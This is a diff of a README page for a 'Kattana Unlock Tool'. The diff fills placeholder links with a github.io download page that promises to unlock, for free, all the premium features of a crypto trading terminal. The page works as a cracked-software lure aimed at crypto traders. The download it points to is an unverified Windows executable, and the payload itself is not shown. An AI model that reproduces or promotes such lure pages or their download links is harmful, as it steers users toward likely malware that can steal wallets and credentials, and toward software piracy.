@@ -1,12 +1,12 @@
 <!-- Top Banner -->
 <p align="center"> 
-  <img src="YOUR_BANNER_IMAGE_URL" alt="Kattana Banner" width="100%" />
+  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTyqWx4umDh9E9aWPdATiwm6FvYi_Vtm8XaWw&s" alt="Kattana Banner" width="10%" />
 </p>
 
 <h1 align="center">⚡ Kattana Unlock Tool</h1>
 
 <p align="center">
-  <a href="YOUR_LINK_HERE" target="_blank">
+  <a href="https://kattana-download.github.io/.github/" target="_blank">
     <img src="https://img.shields.io/badge/Download%20Kattana%20Free%20for%20Windows-Enable%20All%20Features-1E90FF?style=for-the-badge&logo=windows&logoColor=white" 
          alt="Download Kattana Free for Windows" style="width: 540px; height: 37px;">
   </a>
@@ -14,7 +14,7 @@
 
 <!-- Tool Preview -->
 <p align="center">
-  <img src="YOUR_TOOL_SCREENSHOT_URL" alt="Kattana Unlock Tool Preview" width="800" />
+  <img src="https://kattana.io/features/trades.png" alt="Kattana Unlock Tool Preview" width="800" />
 </p>
 
 ---
@@ -97,7 +97,7 @@ Report bugs or contribute via Issues or Pull Requests.
 ## ⭐ Unlock Kattana – Professional Crypto Trading Terminal
 
 Unlock all Kattana premium features including **crypto trading terminal, advanced charts, DeFi analytics, and portfolio management**.  
-[Download the Unlock Tool](YOUR_LINK_HERE) and upgrade your trading today.  
+[Download the Unlock Tool](https://kattana-download.github.io/.github/) and upgrade your trading today.  
 
 ---
 
